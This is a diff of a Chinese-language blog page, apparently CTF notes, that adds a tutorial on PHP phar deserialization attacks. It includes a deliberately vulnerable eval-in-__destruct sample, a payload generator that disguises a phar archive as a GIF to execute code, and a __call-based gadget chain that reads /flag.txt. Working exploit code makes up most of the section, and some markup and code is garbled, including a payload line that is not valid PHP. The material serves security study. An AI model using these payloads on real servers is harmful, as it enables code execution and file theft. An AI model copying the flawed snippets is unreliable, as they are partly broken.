@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2018-10-15</span>
-            <span class="time">07:52:31</span>
+            <span class="time">06:29:36</span>
           </span>
           
           <!--  Categories  -->
@@ -227,6 +227,122 @@ var_dump(unserialize(<span class="hljs-variable">$b</span>));
 <pre><code class="hljs undefined">之前我传入的是";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"photo"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:"flag.php"</span>;&#125;结果失败了，看了网上的一些文章，发现他们传入的是";&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"photo"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:"flag.php"</span>;&#125;为什么前面要多加一个&#125;，后来发现是因为我们<span class="hljs-selector-tag">nickname</span>构造成了数组，而不是字符，所以要加&#125;闭合一下。</code></pre>
 
 <p>所以是34个where</p>
+<h1 id="phar协议漏洞"><a href="#phar协议漏洞" class="headerlink" title="phar协议漏洞"></a>phar协议漏洞</h1><p>利用条件<br>phar文件要能够上传到服务器端。<br>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数<br>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。<br>举个例子<br>upload_file.php，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif<br>upload_file.html 文件上传表单<br>file_un.php 存在file_exists()，并且存在__destruct()<br>我们要写payload绕过gif并且让他执行phpinfo();这就要根据file_un.php<br>生成phar payloads固定流程为:</p>
+<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;
+    &#125;
+    $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span>
+    $o = <span class="hljs-keyword">new</span> TestObject();<span class="hljs-comment">//题目给定的条件</span>
+    $o -&gt; data=<span class="hljs-string">'hu3sky'</span>;要写的payloads
+    $phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
+    $phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
+    <span class="hljs-comment">//签名自动计算</span>
+    $phar-&gt;stopBuffering();
+<span class="hljs-meta">?&gt;</span></span></code></pre>
+
+<p>如下题的file_un.php</p>
+<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
+$filename=$_GET[<span class="hljs-string">'filename'</span>];
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span></span>&#123;
+    <span class="hljs-keyword">var</span> $output = <span class="hljs-string">'echo "ok";'</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span>
+    </span>&#123;
+        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);
+    &#125;
+&#125;
+file_exists($filename);<span class="hljs-comment">//一定要存在 不然没法读取</span></span></code></pre>
+
+<p>payloads为</p>
+<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span></span>&#123;
+    <span class="hljs-keyword">var</span> $output = <span class="hljs-string">'echo "ok";'</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span>
+    </span>&#123;
+        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);
+    &#125;
+&#125;
+$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">'phar.phar'</span>);
+$phar -&gt; stopBuffering();
+$phar -&gt; setStub(<span class="hljs-string">'GIF89a'</span>.<span class="hljs-string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);
+$phar -&gt; addFromString(<span class="hljs-string">'test.txt'</span>,<span class="hljs-string">'test'</span>);
+$object = <span class="hljs-keyword">new</span> AnyClass();
+$object -&gt; output= <span class="hljs-string">'phpinfo();'</span>;
+$phar -&gt; setMetadata($object);
+$phar -&gt; stopBuffering();</span></code></pre>
+
+<p>将phar伪造成其他格式的文件<br>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<strong>HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。<br>生成phar.phar要改成.gif <code>$phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);</code>是关键<br>之后用根据file_exits()访问<br><code>payload:filename=phar://upload_file/phar.gif</code><br><strong>魔术方法的巧妙运用</strong><br>利用一道题看魔术方法来回调用<br>`</strong>destruct()<code>销毁的时候调用</code><strong>construct()<code>构造函数</code></strong>call()`当调用方法不存在或者私有的时候调用<br>例如File类有如下方法读取文件</p>
+<pre><code class="hljs undefined"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;
+    <span class="hljs-keyword">public</span> $filename;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);
+    &#125;
+&#125;</code></pre>
+
+<p>user类如下</p>
+<pre><code class="hljs undefined">class<span class="hljs-built_in"> User </span>&#123;
+    public <span class="hljs-variable">$db</span>;
+    public function __destruct() &#123;
+        <span class="hljs-variable">$this</span>-&gt;db-&gt;close();
+    &#125;
+&#125;</code></pre>
+
+<p>当我们实例化user 销毁时会读取文件 那可能想当然 让file的filename=我们想要读取的文件,因为他没有构造函数,无法给予<br>下面存在这样一个类</p>
+<pre><code class="hljs undefined"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;
+    <span class="hljs-keyword">private</span> $files;
+    <span class="hljs-keyword">private</span> $results;
+    <span class="hljs-keyword">private</span> $funcs;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($func, $args)</span> </span>&#123;
+        array_push(<span class="hljs-keyword">$this</span>-&gt;funcs, $func);<span class="hljs-comment">//迷惑你的 </span>
+        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> $file) &#123;
+            <span class="hljs-keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();
+        &#125;
+    &#125;</code></pre>
+
+<p>call()帮助我们很多<br>如果user的db指向一个filelist类 当我们实例化他的时候 因为close方法不在filelist类里,所以call被调用 $func=close 并且通过this-&gt;flies读取<br>注意一点$this-&gt;files是个数组 因为只有数组会用foreach遍历 那么我们就可以$this-&gt;files=array(我们想要读的文件),再结合phar<br>payloads如下</p>
+<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;
+    <span class="hljs-keyword">public</span> $db;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;
+    <span class="hljs-keyword">public</span> $filename;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;
+    <span class="hljs-keyword">private</span> $files;
+    <span class="hljs-keyword">private</span> $results;
+    <span class="hljs-keyword">private</span> $funcs;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>&#123;
+        $file = <span class="hljs-keyword">new</span> File();
+        $file-&gt;filename = <span class="hljs-string">'/flag.txt'</span>;
+        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>($file);
+        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();
+        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();
+    &#125;
+&#125;
+
+@unlink(<span class="hljs-string">"phar.phar"</span>);
+$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
+
+$phar-&gt;startBuffering();
+
+$phar-&gt;setStub(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span>
+
+$o = <span class="hljs-keyword">new</span> User();
+$o-&gt;db = <span class="hljs-keyword">new</span> FileList();
+
+$phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
+$phar-&gt;addFromString(<span class="hljs-string">"exp.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
+<span class="hljs-comment">//签名自动计算</span>
+$phar-&gt;stopBuffering();
+<span class="hljs-meta">?&gt;</span></span></code></pre>
+
+<p>最后访问phar.phar/exp.txt就是flag</p>
 
         </div>
       </div>
